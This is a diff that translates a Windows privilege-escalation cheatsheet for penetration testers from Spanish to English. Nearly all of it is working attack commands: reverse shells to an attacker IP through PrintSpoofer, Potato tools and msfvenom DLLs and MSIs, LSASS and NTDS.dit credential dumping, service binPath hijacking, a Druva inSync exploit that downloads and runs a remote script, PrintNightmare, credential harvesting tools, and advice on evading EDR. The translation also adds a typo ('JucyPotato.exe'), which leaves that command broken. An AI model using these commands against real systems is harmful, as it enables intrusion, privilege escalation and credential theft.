@@ -1,27 +1,16 @@
 ---
 title: "Windows PrivEsc"
-description: "UAC bypass, token impersonation, services y AlwaysInstallElevated."
+description: "UAC bypass, token impersonation, services, and AlwaysInstallElevated."
 sidebar:
   order: 3
   label: "Windows PrivEsc"
 ---
-
-<aside class="my-8 p-5 rounded-lg border-l-4 border-[#cba6f7] bg-[#cba6f7]/5 not-prose shadow-lg backdrop-blur-sm">
-  <div class="text-xs uppercase tracking-widest text-[#cba6f7] font-bold mb-2 font-mono flex items-center gap-2">
-    <span class="inline-block w-2 h-2 rounded-full bg-[#cba6f7] animate-pulse"></span>
-    Language Fallback · Contenido en Español
-  </div>
-  <p class="text-sm text-zinc-300 leading-relaxed">
-    This methodology cheatsheet is currently written in Spanish. Technical command syntaxes, cheatsheets, and checklists remain highly readable. You can switch back to Spanish at any time using the language toggle above.
-  </p>
-</aside>
-
-> Escalada de privilegios en Windows: abuso de privilegios de token, grupos privilegiados, servicios mal configurados, exploits de kernel, y búsqueda de credenciales en texto claro.
+> Windows privilege escalation: token privilege abuse, privileged groups, misconfigured services, kernel exploits, and cleartext credential hunting.
 
 ---
 
 
-## Enumeración inicial
+## Initial Enumeration
 
 ```powershell
 # Situational awareness
@@ -30,47 +19,47 @@ hostname; whoami; whoami /priv; whoami /groups
 net user; net user USERNAME; net localgroup
 net localgroup Administrators
 
-# Procesos y servicios
+# Processes and services
 tasklist /svc
 Get-Process | Select-Object Name, Id, Path
 
-# Parches instalados
+# Installed patches
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 Get-HotFix | ft -AutoSize
 
-# Red
+# Network
 ipconfig /all; netstat -ano; arp -a
 
-# Software instalado
+# Installed software
 wmic product get name
 Get-ChildItem 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall' |
   Get-ItemProperty | Select-Object DisplayName,DisplayVersion
 
-# AppLocker y Defender
+# AppLocker and Defender
 Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 Get-MpComputerStatus
 ```
 
 ```cmd
-:: Herramientas clásicas CMD
-set                            # variables de entorno
-net accounts                   # política de contraseñas
-echo %PATH%                    # PATH actual
-findstr /spin "password" *.*   # buscar credenciales en archivos
+:: Classic CMD tools
+set                            # environment variables
+net accounts                   # password policy
+echo %PATH%                    # current PATH
+findstr /spin "password" *.*   # search for credentials in files
 ```
 
 ---
 
-## Privilegios clave — Tabla
+## Key Privileges — Table
 
-| Privilegio | Técnica de explotación |
+| Privilege | Exploitation Technique |
 |------------|----------------------|
 | `SeImpersonatePrivilege` | PrintSpoofer (Win10/2019+), JuicyPotato (2016-) |
 | `SeDebugPrivilege` | ProcDump lsass → Mimikatz |
-| `SeBackupPrivilege` | Copiar NTDS.dit + SYSTEM hive → secretsdump |
-| `SeTakeOwnershipPrivilege` | takeown + icacls → modificar ejecutable de servicio |
+| `SeBackupPrivilege` | Copy NTDS.dit + SYSTEM hive → secretsdump |
+| `SeTakeOwnershipPrivilege` | takeown + icacls → modify service executable |
 | `SeLoadDriverPrivilege` | Capcom.sys → EoPLoadDriver + ExploitCapcom |
-| `SeRestorePrivilege` | Restaurar archivos de sistema, DLL hijacking |
+| `SeRestorePrivilege` | Restore system files, DLL hijacking |
 
 ---
 
@@ -79,23 +68,23 @@ findstr /spin "password" *.*   # buscar credenciales en archivos
 ### PrintSpoofer (Windows 10 / Server 2019+)
 
 ```powershell
-# Verificar privilegio
+# Verify privilege
 whoami /priv   # → SeImpersonatePrivilege: Enabled
 
-# Escalar a SYSTEM
+# Escalate to SYSTEM
 .\PrintSpoofer.exe -c "nc.exe OUR_IP 8443 -e cmd"
-.\PrintSpoofer.exe -i -c powershell.exe   # shell interactiva
+.\PrintSpoofer.exe -i -c powershell.exe   # interactive shell
 ```
 
-### JuicyPotato (Windows Server 2016 y anterior)
+### JuicyPotato (Windows Server 2016 and earlier)
 
 ```cmd
-JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe ^
+JucyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe ^
   -a "/c nc.exe OUR_IP 8443 -e cmd.exe" -t *
-:: -l puerto COM local | -t * = CreateProcessWithToken + CreateProcessAsUser
+:: -l local COM port | -t * = CreateProcessWithToken + CreateProcessAsUser
 ```
 
-### RoguePotato / SweetPotato (alternativas modernas)
+### RoguePotato / SweetPotato (Modern Alternatives)
 
 ```powershell
 .\RoguePotato.exe -r OUR_IP -e "nc.exe OUR_IP 8443 -e cmd.exe" -l 9999
@@ -103,17 +92,17 @@ JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe ^
 
 ---
 
-## SeDebugPrivilege → Volcar LSASS
+## SeDebugPrivilege → Dumping LSASS
 
 ```cmd
-:: Usando ProcDump (Sysinternals, no lo detecta AV fácilmente)
+:: Using ProcDump (Sysinternals, not easily detected by AV)
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
-:: Volcar con Task Manager: Detalles → lsass.exe → crear dump
+:: Dump with Task Manager: Details → lsass.exe → create dump
 ```
 
 ```powershell
-# Cargar dump en Mimikatz (en nuestra máquina o localmente)
+# Load dump in Mimikatz (on our machine or locally)
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 ```
@@ -123,11 +112,11 @@ sekurlsa::logonpasswords
 ## SeBackupPrivilege → NTDS.dit
 
 ```powershell
-# Método 1: Copy-FileSeBackupPrivilege (necesita módulo SeBackupPrivilege)
+# Method 1: Copy-FileSeBackupPrivilege (requires SeBackupPrivilege module)
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 
-# Crear shadow copy con diskshadow
+# Create shadow copy with diskshadow
 diskshadow.exe
   set verbose on
   set metadata C:\Windows\Temp\meta.cab
@@ -139,106 +128,106 @@ diskshadow.exe
   end backup
   exit
 
-# Copiar NTDS.dit desde el shadow
+# Copy NTDS.dit from the shadow copy
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 
-# O con robocopy (flag /B para backup mode)
+# Or with robocopy (/B flag for backup mode)
 robocopy /B E:\Windows\NTDS .\ntds ntds.dit
 
-# Guardar hives del sistema
+# Save system hives
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 
-# Extraer hashes (en Kali/Pwnbox)
+# Extract hashes (on Kali/Pwnbox)
 secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
 ```
 
 ---
 
-## SeTakeOwnershipPrivilege → Tomar control de archivo
+## SeTakeOwnershipPrivilege → Taking Ownership of a File
 
 ```cmd
-:: Tomar propiedad
+:: Take ownership
 takeown /f "C:\target\sensitive_file.txt"
 
-:: Dar permisos completos
+:: Grant full permissions
 icacls "C:\target\sensitive_file.txt" /grant htb-student:F
 
-:: Leer el archivo (ej: utilman.exe, sethc.exe)
+:: Read the file (e.g., utilman.exe, sethc.exe)
 ```
 
 ---
 
-## Grupos privilegiados
+## Privileged Groups
 
 ### Backup Operators → SeBackupPrivilege + SeRestorePrivilege
 
 ```powershell
-# Si el usuario es miembro de Backup Operators:
+# If the user is a member of Backup Operators:
 whoami /groups | findstr "Backup"
-# → Usar técnica SeBackupPrivilege (ver arriba)
+# → Use SeBackupPrivilege technique (see above)
 ```
 
-### DnsAdmins → DLL injection en DNS (Domain Admin)
+### DnsAdmins → DLL Injection in DNS (Domain Admin)
 
 ```bash
-# 1. Generar DLL maliciosa (en Kali)
+# 1. Generate malicious DLL (on Kali)
 msfvenom -p windows/x64/exec \
   cmd='net group "domain admins" netadm /add /domain' \
   -f dll -o adduser.dll
 
-# O reverse shell:
+# Or reverse shell:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=OUR_IP LPORT=9001 -f dll -o shell.dll
 ```
 
 ```cmd
-:: 2. Cargar DLL en el servidor DNS (como miembro de DnsAdmins)
+:: 2. Load DLL in the DNS server (as a DnsAdmins member)
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 
-:: 3. Reiniciar el servicio DNS (necesita permisos, a veces disponibles)
+:: 3. Restart the DNS service (requires permissions, sometimes available)
 sc stop dns
 sc start dns
 ```
 
-### Hyper-V Administrators → Admin de VMs (si el DC es VM)
+### Hyper-V Administrators → VM Admin (if the DC is a VM)
 
 ```powershell
-# Miembro de Hyper-V Administrators en un host con DC como VM
-# → Acceso completo a snapshots del DC → extraer NTDS.dit del snapshot
+# Member of Hyper-V Administrators on a host with DC as a VM
+# → Full access to DC snapshots → extract NTDS.dit from the snapshot
 ```
 
 ### Print Operators → SeLoadDriverPrivilege → SYSTEM
 
 ```powershell
-# 1. Habilitar SeLoadDriverPrivilege (a veces deshabilitado por defecto)
-#    Usar EnableSeLoadDriverPrivilege.ps1 o PrivescCheck.ps1
+# 1. Enable SeLoadDriverPrivilege (sometimes disabled by default)
+#    Use EnableSeLoadDriverPrivilege.ps1 or PrivescCheck.ps1
 
-# 2. Cargar driver vulnerable Capcom.sys
+# 2. Load vulnerable driver Capcom.sys
 EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 
-# 3. Explotar el driver para SYSTEM shell
+# 3. Exploit the driver for a SYSTEM shell
 .\ExploitCapcom.exe
 ```
 
-### Server Operators → Modificar binPath de servicio
+### Server Operators → Modifying Service binPath
 
 ```cmd
-:: Cambiar binPath de un servicio que corre como SYSTEM
+:: Change binPath of a service running as SYSTEM
 sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
-sc start AppReadiness     :: fallará pero ejecuta el comando
+sc start AppReadiness     :: will fail but executes the command
 
-:: Verificar
+:: Verify
 net localgroup Administrators
 ```
 
-### Event Log Readers → Leer logs de seguridad
+### Event Log Readers → Read Security Logs
 
 ```powershell
-# Buscar credenciales en logs de Security
+# Search for credentials in Security logs
 wevtutil qe Security /rd:true /f:text | Select-String "/user"
 wevtutil qe Security /rd:true /f:text /c:100 | Select-String "pass"
 
-# Confirmar membresía
+# Confirm membership
 net localgroup "Event Log Readers"
 ```
 
@@ -247,50 +236,50 @@ net localgroup "Event Log Readers"
 ## UAC Bypass — DLL Hijacking
 
 ```bash
-# 1. Generar DLL de reverse shell (en Kali)
+# 1. Generate reverse shell DLL (on Kali)
 msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=8443 \
   -f dll > srrstr.dll
 ```
 
 ```powershell
-# 2. Copiar DLL al path cargado por SystemPropertiesAdvanced.exe
-#    (antes de C:\Windows\System32\, busca en WindowsApps del usuario)
-$env:USERNAME  # → obtener username
-# Colocar en:
+# 2. Copy DLL to the path loaded by SystemPropertiesAdvanced.exe
+#    (before C:\Windows\System32\, searches in user's WindowsApps)
+$env:USERNAME  # → get username
+# Place in:
 # C:\Users\USERNAME\AppData\Local\Microsoft\WindowsApps\srrstr.dll
 
-# 3. Ejecutar el binario afectado (32-bit, bypass UAC automático)
+# 3. Execute the affected binary (32-bit, automatic UAC bypass)
 C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
-# → Recibir shell como usuario con token elevado (High Integrity)
+# → Receive shell as user with elevated token (High Integrity)
 ```
 
 ```powershell
-# Alternativa: Bypass-UAC.ps1 (método sysprep)
+# Alternative: Bypass-UAC.ps1 (sysprep method)
 Import-Module .\Bypass-UAC.ps1
 Bypass-UAC -Method UacMethodSysprep
 ```
 
 ---
 
-## Servicios vulnerables
+## Vulnerable Services
 
 ### Weak Service Permissions (sc config binPath)
 
 ```powershell
-# 1. Detectar con SharpUp
+# 1. Detect with SharpUp
 .\SharpUp.exe audit
 
-# 2. Verificar permisos con accesschk
+# 2. Verify permissions with accesschk
 accesschk.exe /accepteula -quvcw WindscribeService
-# Buscar: SERVICE_ALL_ACCESS o SERVICE_CHANGE_CONFIG para nuestro usuario
+# Search for: SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG for our user
 
-# 3. Cambiar binPath
+# 3. Change binPath
 sc config WindscribeService binpath="cmd /c net localgroup administrators USER /add"
 sc stop WindscribeService
 sc start WindscribeService
 
-# O reverse shell:
+# Or reverse shell:
 sc config SVC binpath="C:\tools\nc.exe OUR_IP 8443 -e cmd.exe"
 sc start SVC
 ```
@@ -298,38 +287,38 @@ sc start SVC
 ### Unquoted Service Paths
 
 ```cmd
-:: Detectar servicios con paths sin comillas y espacios
+:: Detect services with unquoted paths containing spaces
 wmic service get name,displayname,pathname,startmode ^
   | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"
 
-:: Si hay: C:\Program Files\My Service\svc.exe
-:: → Colocar: C:\Program.exe o C:\Program Files\My.exe (que ejecutamos primero)
+:: If path is: C:\Program Files\My Service\svc.exe
+:: → Place: C:\Program.exe or C:\Program Files\My.exe (which runs first)
 ```
 
-### Registry ACL — Weak Permissions en ImagePath
+### Registry ACL — Weak Permissions on ImagePath
 
 ```powershell
-# Verificar ACLs en registry keys de servicios
+# Verify ACLs on service registry keys
 Get-ACL -Path "HKLM:\System\CurrentControlSet\Services\SERVICENAME" | fl
 
-# Si tenemos write access:
+# If we have write access:
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\SERVICENAME" `
   -Name ImagePath -Value "cmd /c net localgroup administrators USER /add"
 sc start SERVICENAME
 ```
 
-### Vulnerable Services (terceros) — Druva inSync
+### Vulnerable Services (Third-party) — Druva inSync
 
 ```powershell
-# Druva inSync 6.6.3 → command injection vía RPC en puerto 6064
-netstat -ano | findstr 6064   # confirmar que el servicio escucha
+# Druva inSync 6.6.3 → command injection via RPC on port 6064
+netstat -ano | findstr 6064   # confirm that service is listening
 
-# PoC PowerShell (modificar $cmd a voluntad)
+# PowerShell PoC (modify $cmd at will)
 $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://OUR_IP/shell.ps1')"
 $s = New-Object System.Net.Sockets.Socket(
-    [System.Net.Sockets.AddressFamily]::InterNetwork,
-    [System.Net.Sockets.SocketType]::Stream,
-    [System.Net.Sockets.ProtocolType]::Tcp)
+     [System.Net.Sockets.AddressFamily]::InterNetwork,
+     [System.Net.Sockets.SocketType]::Stream,
+     [System.Net.Sockets.ProtocolType]::Tcp)
 $s.Connect("127.0.0.1", 6064)
 $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
 $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
@@ -345,37 +334,37 @@ $s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
 ### HiveNightmare / SeriousSAM (CVE-2021-36934) — Win10
 
 ```cmd
-:: Verificar permisos en SAM (usuarios normales no deberían tener acceso)
+:: Verify permissions on SAM (normal users should not have access)
 icacls c:\Windows\System32\config\SAM
-:: Si muestra BUILTIN\Users:(I)(RX) → vulnerable
+:: If it shows BUILTIN\Users:(I)(RX) → vulnerable
 
-:: Explotar (extrae copias de sombra de SAM, SYSTEM, SECURITY)
+:: Exploit (extracts shadow copies of SAM, SYSTEM, SECURITY)
 .\HiveNightmare.exe
 
-:: Extraer hashes (en Kali)
+:: Extract hashes (on Kali)
 impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 ^
   -security SECURITY-2021-08-07 local
 ```
 
-### PrintNightmare (CVE-2021-1675) — Windows universal
+### PrintNightmare (CVE-2021-1675) — Windows Universal
 
 ```powershell
-# Verificar que Spooler esté activo
-ls \\localhost\pipe\spoolss   # → si existe, Spooler está corriendo
+# Verify that Spooler is active
+ls \\localhost\pipe\spoolss   # → if it exists, Spooler is running
 
-# Explotar (añadir usuario local admin)
+# Exploit (add local admin user)
 Import-Module .\CVE-2021-1675.ps1
 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
 
-# Verificar
+# Verify
 net user hacker
 net localgroup administrators
 ```
 
-### MS17-010 EternalBlue (CVE-2017-0144) — Win7/2008 sin parchear
+### MS17-010 EternalBlue (CVE-2017-0144) — Unpatched Win7/2008
 
 ```bash
-# Desde Metasploit
+# From Metasploit
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS TARGET_IP
 set LHOST OUR_IP
@@ -387,143 +376,145 @@ run
 
 ```bash
 # PoC: https://github.com/itm4n/CVE-2020-0668
-# Eleva un ejecutable arbitrario a SYSTEM via symbolic link attack
-# Usar con un ejecutable que añada usuario al grupo Admins
+# Escalates an arbitrary executable to SYSTEM via symbolic link attack
+# Use with an executable that adds a user to the Admins group
 ```
 
 ---
 
-## Búsqueda de credenciales (Credential Hunting)
+## Credential Hunting
 
 ### PowerShell History
 
 ```powershell
-# Localizar archivo de historial
+# Locate history file
 (Get-PSReadLineOption).HistorySavePath
 # → C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
-# Leer historial del usuario actual
+# Read history of current user
 gc (Get-PSReadLineOption).HistorySavePath
 
-# Leer de todos los usuarios (como admin)
+# Read of all users (as admin)
 foreach($user in ((ls C:\users).fullname)){
     cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
 }
 ```
 
-### Buscar contraseñas en archivos
+### Search for Passwords in Files
 
 ```cmd
-:: Buscar "password" en archivos de texto/config
+:: Search for "password" in text/config files
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 
-:: Búsqueda recursiva general
+:: General recursive search
 findstr /spin "password" *.*
 
-:: Buscar archivos por nombre
+:: Search for files by name
 dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
 where /R C:\ *.config
 ```
 
 ```powershell
-# PowerShell — buscar en contenido
+# PowerShell — search in content
 Select-String -Path C:\Users\*\Documents\*.txt -Pattern password -ErrorAction SilentlyContinue
 
-# Buscar por extensión
+# Search by extension
 Get-ChildItem C:\ -Recurse -Include *.rdp,*.config,*.vnc,*.cred -ErrorAction Ignore
 ```
 
-### AutoLogon — credenciales en registro
+### AutoLogon — Credentials in Registry
 
 ```cmd
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-:: Buscar: DefaultPassword, DefaultUserName, AutoAdminLogon = 1
+:: Search for: DefaultPassword, DefaultUserName, AutoAdminLogon = 1
 ```
 
-### PuTTY — proxy credentials en registro
+### PuTTY — Proxy Credentials in Registry
 
 ```powershell
 reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
 reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\SESSION_NAME"
-# Buscar: ProxyUsername, ProxyPassword
+# Search for: ProxyUsername, ProxyPassword
 ```
 
-### WiFi passwords
+### WiFi Passwords
 
 ```cmd
-netsh wlan show profile                      :: listar perfiles
-netsh wlan show profile "SSID" key=clear     :: mostrar contraseña (Key Content)
+:: list profiles
+netsh wlan show profile
+:: show password (Key Content)
+netsh wlan show profile "SSID" key=clear
 ```
 
-### cmdkey — credenciales guardadas para RDP
+### cmdkey — Saved Credentials for RDP
 
 ```cmd
 cmdkey /list
-:: Si hay credenciales → reutilizar con runas
+:: If there are credentials → reuse with runas
 runas /savecred /user:DOMAIN\user "cmd.exe"
 ```
 
-### Unattend.xml — instalaciones desatendidas
+### Unattend.xml — Unattended Installations
 
 ```cmd
-:: Posibles ubicaciones
+:: Possible locations
 type C:\Windows\Panther\Unattend.xml
 type C:\Windows\Panther\Unattend\Unattend.xml
 type C:\Windows\setup\scripts\*.xml
-:: Buscar: <Password><Value>...</Value> (puede ser plaintext o base64)
+:: Search for: <Password><Value>...</Value> (can be plaintext or base64)
 ```
 
-### StickyNotes — base de datos SQLite
+### StickyNotes — SQLite Database
 
 ```powershell
-# Localizar archivo
+# Locate file
 ls C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
 
-# Leer con PSSQLite
+# Read with PSSQLite
 Import-Module .\PSSQLite.psd1
 $db = 'C:\Users\USER\AppData\Local\...\LocalState\plum.sqlite'
 Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
-# Alternativa desde Kali: copiar plum.sqlite* y usar DB Browser for SQLite
-# O: strings plum.sqlite-wal
+# Alternative from Kali: copy plum.sqlite* and use DB Browser for SQLite
+# Or: strings plum.sqlite-wal
 ```
 
 ### Chrome Dictionary + Browser Credentials
 
 ```powershell
-# Chrome dictionary (passwords escritas en el browser)
+# Chrome dictionary (passwords typed in the browser)
 gc 'C:\Users\USER\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
 
-# Browser credentials con SharpChrome (GhostPack)
+# Browser credentials with SharpChrome (GhostPack)
 .\SharpChrome.exe logins /unprotect
 ```
 
-### PowerShell credentials (DPAPI)
+### PowerShell Credentials (DPAPI)
 
 ```powershell
-# Si encontramos un pass.xml o similar
+# If we find a pass.xml or similar
 $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
 $credential.GetNetworkCredential().username
 $credential.GetNetworkCredential().password
 ```
 
-### KeePass — extraer y crackear
+### KeePass — Extract and Crack
 
 ```bash
-# Extraer hash del .kdbx
-python2.7 keepass2john.py archivo.kdbx > hash.txt
+# Extract hash from .kdbx
+python2.7 keepass2john.py file.kdbx > hash.txt
 
-# Crackear con hashcat (mode 13400)
+# Crack with hashcat (mode 13400)
 hashcat -m 13400 hash.txt /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
 ```
 
-### LaZagne — todo-en-uno
+### LaZagne — All-in-One
 
 ```powershell
-.\lazagne.exe all          # todos los módulos
-.\lazagne.exe browsers     # solo browsers
+.\lazagne.exe all          # all modules
+.\lazagne.exe browsers     # browsers only
 .\lazagne.exe windows      # Windows internals (DPAPI, Credman, LSA secrets)
-.\lazagne.exe -vv          # verbose con detalles
+.\lazagne.exe -vv          # verbose with details
 ```
 
 ### SessionGopher — PuTTY, WinSCP, RDP, FileZilla
@@ -531,7 +522,7 @@ hashcat -m 13400 hash.txt /opt/useful/seclists/Passwords/Leaked-Databases/rockyo
 ```powershell
 Import-Module .\SessionGopher.ps1
 Invoke-SessionGopher -Target HOSTNAME
-Invoke-SessionGopher -Thorough    # también busca .ppk, .rdp
+Invoke-SessionGopher -Thorough    # also searches for .ppk, .rdp
 ```
 
 ---
@@ -539,89 +530,89 @@ Invoke-SessionGopher -Thorough    # también busca .ppk, .rdp
 ## AlwaysInstallElevated
 
 ```cmd
-:: Verificar ambas claves (deben ser 0x1 en ambas)
+:: Verify both registry keys (both must be 0x1)
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
 ```powershell
-# Con PowerUp → generar MSI malicioso
+# With PowerUp → generate malicious MSI
 Import-Module .\PowerUp.ps1
-Write-UserAddMSI    # crea UserAdd.msi en el directorio actual
+Write-UserAddMSI    # creates UserAdd.msi in the current directory
 
-# Ejecutar el MSI (pide usuario/contraseña para añadir al grupo Admins)
+# Execute the MSI (prompts for user/password to add to the Admins group)
 .\UserAdd.msi
 ```
 
 ```bash
-# Con msfvenom (payload MSI)
+# With msfvenom (MSI payload)
 msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=9001 -f msi > shell.msi
 
-# Ejecutar en el target (como usuario normal → SYSTEM)
+# Execute on the target (as normal user → SYSTEM)
 msiexec /quiet /qn /i shell.msi
 ```
 
 ---
 
-## Herramientas de enumeración automática
+## Automated Enumeration Tools
 
 ```powershell
-# winPEAS — enumeración completa
+# winPEAS — complete enumeration
 .\winPEASx64.exe
-.\winPEASx64.exe quiet         # menos output
+.\winPEASx64.exe quiet         # less output
 
-# SharpUp — focuses en privesc paths
+# SharpUp — focuses on privesc paths
 .\SharpUp.exe audit
 
-# PowerUp — PowerShell puro
+# PowerUp — pure PowerShell
 Import-Module .\PowerUp.ps1
 Invoke-AllChecks
 
-# Seatbelt — situational awareness detallado
+# Seatbelt — detailed situational awareness
 .\Seatbelt.exe -group=all
 
 # Watson — kernel CVE checker
 .\Watson.exe
 
-# WES-NG — desde Kali, basado en systeminfo
+# WES-NG — from Kali, based on systeminfo
 python3 wes.py systeminfo.txt -i "Elevation of Privilege"
 ```
 
 ---
 
-## Citrix / Kiosk Breakout (resumen)
+## Citrix / Kiosk Breakout (Summary)
 
 ```
-1. Abrir una app que tenga File → Open (Paint, Notepad, Wordpad)
-2. En el dialog box → escribir UNC path: \\127.0.0.1\c$\users\USER
-3. Ejecutar cmd desde SMB share con pwn.exe (binario que llama system("cmd.exe"))
-4. Detectar AlwaysInstallElevated → PowerUp Write-UserAddMSI → backdoor admin
-5. UAC bypass con Bypass-UAC.ps1 -Method UacMethodSysprep
+1. Open an app that has File → Open (Paint, Notepad, Wordpad)
+2. In the dialog box → type the UNC path: \\127.0.0.1\c$\users\USER
+3. Execute cmd from SMB share with pwn.exe (binary that calls system("cmd.exe"))
+4. Detect AlwaysInstallElevated → PowerUp Write-UserAddMSI → backdoor admin
+5. UAC bypass with Bypass-UAC.ps1 -Method UacMethodSysprep
 ```
 
 ---
 
 ## Pitfalls / Gotchas
 
-- **PrintSpoofer vs JuicyPotato:** PrintSpoofer funciona en Win10/Server 2019+. JuicyPotato requiere Win Server ≤2016 (el CLSID por defecto no funciona en versiones modernas).
-- **SeImpersonate en contexto de servicio:** el privilegio debe estar *habilitado* (`Enabled`), no solo presente (`Present`). Verificar con `whoami /priv`.
-- **SeDebugPrivilege + lsass:** en Win10 20H2+ con Credential Guard, lsass estará protegido y Mimikatz no extraerá credenciales útiles del dump.
-- **DnsAdmins:** reiniciar el servicio DNS requiere tener el privilegio `SC_MANAGER_ALL_ACCESS` o ser admin local. En DCs, los miembros de DnsAdmins pueden reiniciarlo; en servidores separados, no siempre.
-- **HiveNightmare:** solo aplica a Windows 10 21H1 y anteriores (KB5003791 lo parchea). Verificar con `winver`.
-- **UAC bypass srrstr.dll:** funciona cuando el binario `SystemPropertiesAdvanced.exe` busca `srrstr.dll` en `WindowsApps` del usuario. El path exacto varía por versión de Windows.
-- **Unquoted paths:** la explotación solo funciona si tenemos write en el directorio padre y el servicio corre como SYSTEM/privilegiado.
-- **AlwaysInstallElevated:** ambas claves HKCU y HKLM deben estar en 1. Si solo una está configurada, no funciona.
-- **winPEAS ruido:** genera eventos de log (ID 4688, 4703). En engagements sigilosos, preferir enumeración manual o scripts más pequeños.
-- **cmdkey /runas:** si la contraseña guardada en cmdkey es antigua o expiró, `runas /savecred` devolverá acceso denegado sin error claro.
-- **LaZagne detección:** es bien conocido por EDRs. Subir renombrado o usar desde memoria (IEX + downloadString).
-- **Druva inSync 6.6.3:** el path traversal `../../../Windows/System32/cmd.exe` funciona porque el servicio valida el inicio de path pero no la salida.
+- **PrintSpoofer vs JuicyPotato:** PrintSpoofer works on Win10/Server 2019+. JuicyPotato requires Win Server ≤2016 (the default CLSID does not work on modern versions).
+- **SeImpersonate in service context:** the privilege must be *enabled* (`Enabled`), not just present (`Present`). Verify with `whoami /priv`.
+- **SeDebugPrivilege + lsass:** in Win10 20H2+ with Credential Guard, lsass will be protected, and Mimikatz will not extract useful credentials from the dump.
+- **DnsAdmins:** restarting the DNS service requires having the `SC_MANAGER_ALL_ACCESS` privilege or being a local admin. On DCs, DnsAdmins members can restart it; on standalone servers, not always.
+- **HiveNightmare:** only applies to Windows 10 21H1 and earlier (patched by KB5003791). Verify with `winver`.
+- **UAC bypass srrstr.dll:** works when the `SystemPropertiesAdvanced.exe` binary looks for `srrstr.dll` in the user's `WindowsApps` folder. The exact path varies by Windows version.
+- **Unquoted paths:** exploitation only works if we have write access to the parent directory and the service runs as SYSTEM/privileged.
+- **AlwaysInstallElevated:** both HKCU and HKLM registry keys must be set to 1. If only one is configured, it will not work.
+- **winPEAS noise:** generates log events (ID 4688, 4703). For stealthy engagements, prefer manual enumeration or smaller scripts.
+- **cmdkey /runas:** if the password saved in cmdkey is old or expired, `runas /savecred` will return access denied without a clear error.
+- **LaZagne detection:** well known by EDRs. Upload it renamed or use it from memory (IEX + downloadString).
+- **Druva inSync 6.6.3:** the path traversal `../../../Windows/System32/cmd.exe` works because the service validates the start of the path but not the exit.
 
 ---
 
-## Cheatsheets relacionados
+## Related Cheatsheets
 
-- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — escalada de dominio una vez con foothold local
+- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — domain escalation once you have local foothold
 - [Password Attacks](/en/metodologias/exploitation/password-attacks/) — hashcat, cracking, Pass-the-Hash, PTT
-- [File Transfers](/en/metodologias/privesc/file-transfers/) — mover winPEAS/SharpUp al target
-- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells y payloads para los exploits
-- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — contraparte en sistemas Linux
+- [File Transfers](/en/metodologias/privesc/file-transfers/) — move winPEAS/SharpUp to the target
+- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells and payloads for exploits
+- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — counterpart on Linux systems
